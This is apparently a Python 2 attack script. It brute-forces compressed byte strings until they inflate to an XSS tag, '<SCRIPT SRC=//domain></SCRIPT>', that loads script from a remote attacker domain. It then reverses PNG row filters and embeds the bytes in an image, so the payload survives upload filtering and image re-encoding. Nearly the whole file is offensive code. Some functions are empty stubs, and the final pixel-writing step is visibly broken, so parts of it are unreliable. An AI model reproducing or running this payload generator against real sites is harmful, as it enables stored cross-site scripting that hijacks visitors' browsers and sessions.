from math import floor
from PIL import Image
import zlib, binascii

def gzdeflate(string):
        deflated = zlib.compress(string)[2:-4]
        return deflated

def hex2bin(hexstr):
	try:
		binstr = hexstr.decode('hex')
	except TypeError:
		return 'ff'
	return binstr

def bin2hex(binstr):
	hexstr = binstr.encode('hex')
	return hexstr

def calcKeyspace(dynamicPayload):
	i=0
	end ='0x'
	start = '0x'
	while i <= len(dynamicPayload):
		start += '11'
		end += 'ff'
		i += 1
	end = int(end,16)
	start = int(start,16)
	keyspace = end-start
	print "[-]Calculated Dynamic Keyspace:",str(keyspace)
	return start, end, keyspace

def remoteDomainParse(remoteDomain):
	prefix = '.'.join(remoteDomain.split(".")[:-1])
	tld = ''.join(remoteDomain.split(".")[-1:])
	return prefix,tld

def calcBruteMethod(remoteDomain, prefix, tld):
	#Payload
	targetPayload = "<SCRIPT SRC=//"+remoteDomain+"></SCRIPT>"
	print "[+]PAYLOAD:"
	print "[-]Target Payload:", targetPayload
	
	if tld == "BZ":
		print "[+]Known tld detected, trying fast method!"
		gzdeflatePayload = aLogue(targetPayload, prefix)
		return gzdeflatePayload
	elif tld == "PE":
		print "[+]Known tld detected, trying fast method!"
		gzdeflatePayload = fin1te(targetPayload, prefix)
		return gzdeflatePayload
	elif tld == "CZ":
		print "[+]Known tld detected, trying fast method!"
		gzdeflatePayload = vavkamil(targetPayload, prefix)
		return gzdeflatePayload
	else:
		print "[+] Unknown tld, attempting slow method"
		gzdeflatePayload = vakamilBrute(targetPayload, prefix, tld)
		return gzdeflatePayload
def filterBypass(gzdeflatePayload):
	print "[+]Crafting payload to bypass PNG filters..."
	pList=[]
	bList=[]
	payload=[]
	#Convert hex string into hex lists
	for i in range(0,len(gzdeflatePayload), 2):
		pList.append('0x'+gzdeflatePayload[i:i+2])
	for i in pList:
		i = int(i,16)
		bList.append(i)
	#duplicate
	bList2=bList

	#reverse filter 1
	i=0
	while i < (len(bList)-3):
		bList[i+3] = (bList[i+3] + bList[i]) % 256
		i+=1
	for filter1 in bList:
		payload.append(filter1)

	#reverse filter 3
	i = 0
	while i < (len(bList2)-3):
		bList2[i+3] = (bList2[i+3] + floor(bList2[i] / 2)) % 256
		i += 1
	for filter3 in bList2:
		payload.append(int(filter3))

	print "[+]Filter-Proof Payload Crafted!"
	print "Filter-Proof Payload: %s" % ''.join([(hex(i)) for i in payload]).replace('0x','')
	return payload

def generateFinalPayload(payload, outputImage):
	#Thanks to admanLogue and hLk_886 for this PNG Code
	im = Image.new('RGB', (32,32))
	i = 0
	c = 0
	if i >= len(payload):
		r = payload[i]
		g = payload[i+1]
		b = payload[i+2]
		im.putpixel((c,0), (r,g,b))
		i += 3
		c += 1

	im.save(outputImage)
	print "[!!] COMPLETE [!!]"
	print "[!!] PNG Payload Saved as: %s" % outputImage

def fin1te(remoteDomain, prefix, tld):
	#todo
	return

def aLogue(targetPayload, prefix):
	#Calculate keyspace
	start = 0x111111
	end = 0xffffff
	keyspace = end-start
	print "[-]Calculated Keyspace: %s" % str(keyspace)
	raw_input("[*]Press Any Key to Begin Bruteforce")

	#BruteForce	
	print "[+]Starting Gzdeflate Payload Bruteforce..."
	i=1
	while start < end:
		if i % 500000 == 0:
			print "[-]Guess: %s/%s -- Left: %s" % (i,keyspace,keyspace-i)
		#brute = hex(start).encode('ascii')[2:]
		brute = hex(start)[2:]
		if "L" in brute:
			brute = brute[:-1]
		guess = 'f399281922111510691928276e6e'+brute+'1e581b1f576e69b16375535b6f0e7f'
		##DEBUG
		##guess = 'f399281922111510691928276e6e562e2c1e581b1f576e69b16375535b6f0e7f'
		deflate = gzdeflate(hex2bin(guess))
		if targetPayload.upper() in deflate.upper():
			print "[!]GZDEFLATE PAYLOAD FOUND!"
			print "Gzdeflate Payload String: %s" % repr(deflate)
			print "Gzdeflate Payload: %s" % guess
			return guess
		start += 1
		i+=1
	return False

def vavkamil(remoteDomain, prefix, tld):
	#todo
	return
'''
def gzdeflateBrute(start, end, keyspace, targetPayload, prefix, tld):
	#BruteForce	
	print "[+]Starting Gzdeflate Payload Bruteforce..."
	i=1
	while start < end:
		if i % 500000 == 0:
			print "[-]Guess:",str(i)+"/"+str(keyspace), "--", "Left:",str(keyspace-i)
		brute = hex(start).encode('ascii')[2:]
		if "L" in brute:
			brute = brute[:-1]
		guess = '7ff399281922111510691928276e6e'+brute+'576e69b16375535b6f'
		deflate = gzdeflate(hex2bin(guess))
		
		#DEBUG
		##guess = 'f399281922111510691928276e6e562e2c1e581b1f576e69b16375535b6f0e7f'
		##print targetPayload.upper()
		##print deflate.upper()
		if targetPayload.upper() in deflate.upper():
			print "[!]GZDEFLATE PAYLOAD FOUND!"
			print "Gzdeflate Payload String: %s" % repr(deflate)
			print "Gzdeflate Payload: %s" % guess
			break
		else:
			start += 1
			i += 1
'''
